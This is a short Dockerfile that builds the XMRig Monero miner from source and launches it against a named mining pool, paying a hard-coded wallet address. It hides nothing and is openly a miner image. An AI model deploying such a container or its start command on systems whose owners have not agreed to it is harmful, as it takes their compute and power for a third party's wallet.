FROM ubuntu:16.04

WORKDIR /app
USER root

RUN apt-get -y update

RUN apt-get install -y git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libxext-dev libpng-dev libimlib2-dev libglew-dev libxrender-dev libxrandr-dev libglm-dev libhwloc-dev hwloc

RUN git clone https://github.com/xmrig/xmrig.git
WORKDIR /app/xmrig
WORKDIR /app/xmrig/build
RUN cmake ..
RUN make

CMD ./xmrig --donate-level 1 -o monerohash.com:2222 -u 89mvBaUVy4r6A2rNBVdatMBaLP27zPYGyivmDbJFqFPvUxEwVB4v4V52wgnpH6BWvjHkyzZLMJso7YUgsNwY15y9UD6A6az -p x -k
